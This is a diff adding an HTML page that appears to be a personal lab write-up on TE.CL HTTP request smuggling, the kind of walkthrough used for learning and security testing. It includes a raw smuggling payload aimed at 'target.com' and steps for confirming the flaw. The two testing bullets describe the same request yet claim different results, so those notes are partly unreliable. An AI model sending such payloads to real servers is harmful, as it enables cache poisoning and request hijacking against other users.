@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTTP Request Smuggling - TE.CL</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="../../styles.css">
+</head>
+<body class="bg-gray-900 text-white p-8 font-mono">
+
+  <header class="flex justify-between items-center p-5 mb-10 border-b border-green-800 sticky top-0 z-50 bg-gray-900 backdrop-blur-sm">
+    <a href="../../index.html"><h1 class="text-3xl font-bold font-mono text-green-400">>_ M4ZiX:~</h1></a>
+  </header>
+
+  <div class="max-w-4xl mx-auto">
+    <h1 class="text-4xl text-green-400 font-bold mb-6">HTTP Request Smuggling - TE.CL</h1>
+    <p class="mb-2 text-sm text-gray-400">Tags: HTTP, Smuggling, TE.CL, Security Testing</p>
+    <hr class="my-4 border-green-700">
+
+    <section class="mb-10">
+      <h2 class="text-2xl text-green-300 mb-2">🎯 Goal</h2>
+      <p>Confirm a TE.CL HTTP request smuggling vulnerability via differential responses and deliver a smuggled request.</p>
+    </section>
+
+    <section class="mb-10">
+      <h2 class="text-2xl text-green-300 mb-2">🛠️ Walkthrough</h2>
+
+      <h3 class="text-xl text-green-200 mt-6 mb-2">1. Identify Header Behavior</h3>
+      <p>Determine whether frontend/backend rely on <code>Content-Length</code> (CL) or <code>Transfer-Encoding</code> (TE) headers. Use <strong>HTTP/1.1</strong> requests for testing.</p>
+
+      <h3 class="text-xl text-green-200 mt-6 mb-2">2. Differential Testing</h3>
+      <ul class="list-disc list-inside space-y-2 mb-4">
+        <li>Send request with incorrect large <code>Content-Length</code> + correct body:  
+        <strong>CL.TE</strong> → <code>400 Bad Request</code> error.</li>
+        <li>Send request with incorrect large <code>Content-Length</code> + correct body:  
+        <strong>TE.CL</strong> → <code>500 Timeout</code> error.</li>
+      </ul>
+      <p>Observed response → frontend uses <strong>TE</strong> → TE.CL vulnerability confirmed.</p>
+
+      <h3 class="text-xl text-green-200 mt-6 mb-2">3. Smuggle Request</h3>
+      <p>Craft payload to smuggle an HTTP request through the TE.CL processing:</p>
+      <pre class="bg-black text-green-400 p-4 rounded-lg overflow-x-auto"><code>POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+2c
+POST /404 HTTP/1.1
+Content-Length:15
+
+x=1
+0</code></pre>
+      <p>Sending a normal request afterwards will be corrupted by the smuggled request → confirms successful exploitation ✅</p>
+    </section>
+
+    <section class="mt-10">
+      <h2 class="text-2xl text-yellow-400 mb-2">💡 Lessons Learned</h2>
+      <ul class="list-disc list-inside">
+        <li>TE.CL vulnerabilities arise when backend processes both <code>Transfer-Encoding</code> and <code>Content-Length</code> inconsistently.</li>
+        <li>Differential responses (400 vs 500) help identify the vulnerable header sequence.</li>
+        <li>Crafted smuggled requests can bypass frontend checks and manipulate backend processing.</li>
+        <li>Always test with HTTP/1.1; HTTP/2 handles headers differently and may prevent smuggling.</li>
+      </ul>
+    </section>
+  </div>
+</body>
+</html>
